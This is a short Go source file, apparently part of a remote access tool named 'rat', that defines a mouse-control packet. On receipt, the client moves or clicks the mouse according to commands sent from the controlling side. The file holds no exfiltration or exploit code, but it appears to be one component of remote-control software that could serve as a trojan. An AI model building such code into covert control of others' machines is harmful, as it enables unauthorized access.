package main

import (
	"rat/client/screen"
	"rat/shared/network/header"
)

type MousePacket struct {
	MonitorID   int `network:"receive"`
	MouseButton int `network:"receive"`
	Type        int `network:"receive"`
}

func (packet MousePacket) Header() header.PacketHeader {
	return header.MouseHeader
}

func (packet MousePacket) OnReceive() error {
	screen.Mouse(packet.MonitorID, packet.MouseButton, packet.Type)
	return nil
}
